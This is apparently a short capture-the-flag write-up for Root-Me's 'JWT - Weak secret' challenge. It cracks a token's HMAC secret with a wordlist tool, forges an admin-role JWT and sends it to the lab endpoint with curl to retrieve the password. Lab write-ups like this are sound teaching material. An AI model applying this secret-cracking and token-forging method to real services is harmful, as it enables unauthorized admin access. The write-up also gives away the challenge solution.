[JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
for this level we know that should find the secret and then try to build a new jwt token and make the role to admin.
the original jwt :
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw`

we use cookie monster to find the secret :
```bash
cookiemonster -cookie eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
```
the output :
```text
🍪 CookieMonster 1.4.0
ℹ️  CookieMonster loaded the default wordlist; it has 38920 entries.
✅ Success! I discovered the key for this cookie with the jwt decoder; it is "lol".
```
so the secret is `lol`.
we go to jwt.io and create a new jwt using this credential :
HEADER : 
```
{
  "alg": "HS512",
  "typ": "JWT"
}
```
PAYLOAD : 
```
{
  "role": "admin"
}
```
secret :
```
lol
```
and the jwt is : 
`eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg`

so we should now send the POST request and get the password :
```bash
curl -X POST http://challenge01.root-me.org/web-serveur/ch59/admin -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg"
```
and there you go you have the password.